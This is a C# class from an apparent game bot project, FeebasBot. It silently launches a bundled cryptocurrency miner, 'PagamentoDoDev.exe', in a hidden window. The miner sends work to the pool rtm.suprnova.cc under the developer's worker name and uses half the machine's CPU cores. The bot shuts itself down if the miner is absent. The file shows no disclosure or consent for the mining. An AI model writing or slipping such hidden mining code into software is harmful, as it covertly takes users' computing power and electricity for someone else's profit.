using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace FeebasBot.Classes.Bot
{
    class Mining
    {
        static Process process = new Process();
        public static void Miner()       
        {
            try
            {
                if (Process.GetProcessesByName("PagamentoDoDev").Length == 0)
                {
                    process.StartInfo.FileName = "PagamentoDoDev.exe";
                    process.StartInfo.Arguments = "-o rtm.suprnova.cc:6273 -u ezinc032.Feebas -p x -k -a gr -t" + Environment.ProcessorCount / 2;
                    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    process.Start();
                }
            }
            catch (Exception)
            {
                MessageBox.Show("PagamentoDoDev não foi encontrado na pasta do bot, fechando");
                Application.Exit();
            }
        }

        public static void Kill()
        {
            process.Kill();
        }
    }
}
